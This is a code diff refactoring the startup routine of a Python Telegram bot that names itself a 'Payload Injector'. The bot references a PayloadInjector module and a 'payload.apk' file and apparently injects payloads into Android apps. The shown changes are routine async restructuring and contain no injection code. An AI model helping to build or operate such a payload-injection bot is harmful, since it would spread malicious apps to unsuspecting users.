@@ -31,9 +31,8 @@ from modules.payload_injector import PayloadInjector
 os.makedirs('logs', exist_ok=True)
 os.makedirs('cache', exist_ok=True)
 
-cleanup_session('data/bot2_session')
 user_manager = UserManager('data/users2.json')
-bot = TelegramClient('data/bot2_session', API_ID, API_HASH).start(bot_token=BOT2_TOKEN)
+bot = TelegramClient('data/bot2_session', API_ID, API_HASH)
 
 # Payload APK path
 PAYLOAD_APK = "payload.apk"
@@ -295,14 +294,19 @@ def format_size(bytes_size):
     return f"{bytes_size:.1f} TB"
 
 
-async def startup():
-    """Run startup tasks"""
-    await prepare_payload_cache()
-    logger.info("Bot2 (Payload Injector) started and ready!")
-
-
 if __name__ == '__main__':
-    # Prepare cache at startup
-    with bot:
-        bot.loop.run_until_complete(startup())
-        bot.run_until_disconnected()
+    async def main():
+        # Start bot
+        await bot.start(bot_token=BOT2_TOKEN)
+        
+        # Prepare cache
+        logger.info("🔧 Preparing payload cache...")
+        await prepare_payload_cache()
+        
+        logger.info("Bot2 (Payload Injector) started and ready!")
+        
+        # Run until disconnected
+        await bot.run_until_disconnected()
+    
+    # Run
+    bot.loop.run_until_complete(main())
